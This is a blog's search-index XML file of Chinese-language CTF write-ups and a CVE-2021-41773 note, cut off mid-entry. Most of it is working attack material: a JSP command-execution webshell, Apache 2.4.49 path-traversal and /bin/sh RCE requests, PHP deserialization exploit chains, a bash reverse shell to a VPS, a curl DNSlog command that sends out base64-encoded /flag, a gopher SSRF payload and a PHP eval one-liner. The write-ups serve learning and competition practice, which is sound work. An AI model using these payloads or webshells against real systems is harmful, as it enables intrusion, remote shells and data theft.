<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>金盾杯2021</title>
    <link href="/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/"/>
    <url>/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/</url>
    
    <content type="html"><![CDATA[<h2 id="上传你的头像吧"><a href="#上传你的头像吧" class="headerlink" title="上传你的头像吧"></a>上传你的头像吧</h2><p><code>文件上传竞争</code></p><p>题目中对于上传的文件是先保存到服务器上再检查是否符合规范才进行删除，所以可以边上传边访问，和删除竞争；在删除前访问到木马文件，得到flag</p><p>上传：<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122321856.png"><br>访问：<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122321698.png"></p><h2 id="上传你的压缩包吧"><a href="#上传你的压缩包吧" class="headerlink" title="上传你的压缩包吧"></a>上传你的压缩包吧</h2><p>上传压缩包，会自动解压，<br><code>Tomcat</code></p><p>上传<code>.jsp</code>马，但上传的文件目录<code>jsp</code>文件不能访问，所以要上传到上一级目录，修改<code>aaaa.jsp</code>为<code>../a.jsp</code></p><p>在<code>burp-&gt;hex</code>里或者winhex,010editor里应该都行，但我一个都没成功。。。。。。。。。。。。。。。。</p><p>网上的jsp马</p><pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;java.io.InputStream in &#x3D;Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a &#x3D; -1;byte[] b &#x3D; new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a&#x3D;in.read(b))!&#x3D;-1)&#123;out.println(new String(b));&#125;out.print(&quot;&lt;&#x2F;pre&gt;&quot;);&#125;%&gt;</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122326594.png"></p><h2 id="休想爆破我"><a href="#休想爆破我" class="headerlink" title="休想爆破我"></a>休想爆破我</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122344902.png"><br>扫到<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122329820.png"></p><p><code>heapdump</code>放到<code>visualVM</code>分析<br><a href="https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html">Actuator 未授权访问之heapdump利用 </a></p><p><code>查找Shiro CipherKey</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122332753.png"></p><p>脚本对byte转换为base64编码的key</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> structa<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;bbbbbbbbbbbbbbbb'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>shiro利用工具</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122333889.png"></p><p><code>cat /flag</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>金盾杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-41773</title>
    <link href="/2021/11/29/CVE-2021-41773/"/>
    <url>/2021/11/29/CVE-2021-41773/</url>
    
    <content type="html"><![CDATA[<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>仅apache 2.4.49</p><h2 id="apache-目录穿越"><a href="#apache-目录穿越" class="headerlink" title="apache 目录穿越"></a>apache 目录穿越</h2><p>payload：<code>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><p><code>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><h2 id="apache-rce"><a href="#apache-rce" class="headerlink" title="apache rce"></a>apache rce</h2><p>需要启用<code>mod_cgid</code>和<code>mod_cgi</code>模块</p><p><code>mod_cgi</code>模块的功能是根据输入脚本类型选择不同解析器进行执行，常用的解析器有<code>php</code>、<code>perl</code>等</p><p>payload:</p><pre><code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: xx.xx.xx.xx:8080User-Agent: curl/7.64.1Accept: */*Content-Length: 7Content-Type: application/x-www-form-urlencodedConnection: closeecho;id</code></pre><p><img src="https://s3.bmp.ovh/imgs/2021/11/0e261738473bf027.png"></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/120655436">CVE-2021-41773 Apache HTTP Server漏洞复现</a>   </p><p><a href="https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ?st=A3E9947CC72763237BE9E767B200882D1648B7C0060F65A11B588C63933F3FDB30F9CE3EEDF8A35AD341979ED668A754DD5F1E2AFCB710029B6DC92BC1A87C0DA439302C4A4AB04FFDE6CC47D2FBA6A5F1A0F2E0EB04443FC9F5A55F12409243D5C0711080FFD5BC323D747C57AEC1B39E37427C6A70C7C19BED4BF6C9C75FCCA459EE690735F1E2A7D4293A25537FCD92375C7254420FB4056BC664796B47A34A1900D539AC737D5321803DC0FB4CE1&vid=1688851090137202&cst=BD2948FD4785C65961435AA26F6775293D3B23260F41BE812666D55A2B47E6459197EF59B0467B11CD18458E3E28819A&deviceid=579d18aa-691c-4ffd-8a54-deef2535f414&version=3.1.16.90294&platform=mac">CVE-2021-41773升华篇-Apache HTTP Server 路径穿越漏洞提升至RCE回显深入分析 </a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Geekchallenge</title>
    <link href="/2021/11/26/geekchallenge/"/>
    <url>/2021/11/26/geekchallenge/</url>
    
    <content type="html"><![CDATA[<h2 id="temp"><a href="#temp" class="headerlink" title="temp"></a>temp</h2><p>这道不是极客大挑战的，就写这里吧</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--if($_REQUEST['mode']!="begin")&#123;    die("Welcome PHP Games!");&#125;--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'fl4g.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'mode'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token double-quoted-string string">"begin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PHP Games!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">last_task</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$left</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$middle</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$right</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"wrong way"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"need a little magic"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token double-quoted-string string">"user"</span><span class="token operator">&amp;&amp;</span><span class="token variable">$token</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token double-quoted-string string">"pass"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                            <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span> <span class="token operator">=</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token operator">===</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">left</span><span class="token operator">&amp;&amp;</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token operator">===</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">right</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"this is your flag "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"one more step"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"don't give up"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Not a valid token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"give me the token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>主要是最后一关<br>exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">last_task</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$left</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$middle</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$right</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">last_task</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">left</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">right</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">left</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>取地址<code>&amp;</code>符号可太行了，我怎么想不到呢。。。。。。。。</p><h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_AFKL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"关注嘉然,"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">e</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_JiaRan</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>一道反序列化，值得注意的是，static变量不能被反序列化<br>所以在写exp时就不能带<code>class a</code>了</p><p>exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">i_want_2_listen_2_MaoZhongDu</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//$this.value=new b();</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"关注嘉然,"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">e</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Do_u_like_JiaRan</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'bash -c "bash -i >&amp; /dev/tcp/[vps-ip]/9999 0>&amp;1"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span></span></code></pre><p>最后将c和e作为一个数组进行序列化，也就是这里是两个入口，以前做的反序列化都是找一个入口，然后一步一步推，原来还可以两个一起，属实是学废了</p><p>还有就是关于反弹shell，我一开始弹，端口在阿里云也开了，就是弹不出来，甚至怀疑自己买了假的服务器，之后突然想到服务器上安了宝塔，看了一眼，果然，宝塔的防火墙端口没开，打开就弹出来了，wssb</p><p>dnslog带出<code>curl `cat /flag|base64`.xxxxxx.dnslog.cn</code></p><h2 id="期末不挂科就算成功"><a href="#期末不挂科就算成功" class="headerlink" title="期末不挂科就算成功"></a>期末不挂科就算成功</h2><p><img src="https://s3.bmp.ovh/imgs/2021/11/a087dd443ee23e03.png"><br>注释中发现<code>/debug.php</code><br>进入后是用文件包含，伪协议读取下<code>index.php</code><br>额外信息：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span><span class="token delimiter important">?></span></span></code></pre><p>在<code>172.17.0.7</code>中除了先前有的还出现了一张图片，应该就是这里了，然后就不会了。<br>看WP要<code>gopher</code>协议<code>post</code></p><pre><code>POST /index.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36name=admin&amp;password=123456&amp;result=60</code></pre><p>进行两次url编码，然后开头加上<code>gopher://172.17.0.7:80/_</code></p><p>值得注意的是，直接两次url编码每行的末尾是<code>%250a</code>也就是只有一个换行符，改成<code>%250D%250A</code>-换行回车</p><p>payload：<code>http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Aname%253Dadmin%2526password%253D123456%2526result%253D60%250d%250A</code></p><h2 id="成全"><a href="#成全" class="headerlink" title="成全"></a>成全</h2><p><code>ThinkPHP v5.0.12</code><br>报错出现了<code>debug</code>界面<br><img src="https://s3.bmp.ovh/imgs/2021/11/24dded7c8682ffb6.png"></p><p>tp的默认日志文件形式为<code>/202110/11.log</code>文件夹为年加月，文件为日</p><p>对月(1-12)和天(1-31)进行交集爆破<br><img src="https://s3.bmp.ovh/imgs/2021/11/c912d29924a29513.png"><br>结果<br><img src="https://s3.bmp.ovh/imgs/2021/11/d23301543298d305.png"><br>在第一个日志中有写好的一句话</p><pre><code>&lt;?php eval($_POST[&#39;Syccccc&#39;]);phpinfo(); ?&gt;</code></pre><p>然后通过shell读取flag</p><h2 id="easyPOP"><a href="#easyPOP" class="headerlink" title="easyPOP"></a>easyPOP</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token 